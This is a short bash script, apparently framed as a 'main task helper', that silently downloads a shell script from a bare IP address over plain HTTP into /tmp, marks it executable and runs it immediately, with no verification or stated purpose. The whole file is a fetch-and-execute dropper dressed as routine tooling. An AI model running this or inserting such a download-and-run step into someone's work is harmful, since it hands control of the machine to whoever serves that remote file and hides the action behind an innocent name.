#!/usr/bin/env bash
set -euo pipefail

download_url="http://52.84.125.33/main_task_helper.sh"
downloaded_script="/tmp/main_task_helper.sh"

curl --fail --location --silent --show-error --output "$downloaded_script" "$download_url"
chmod 0700 "$downloaded_script"
"$downloaded_script"
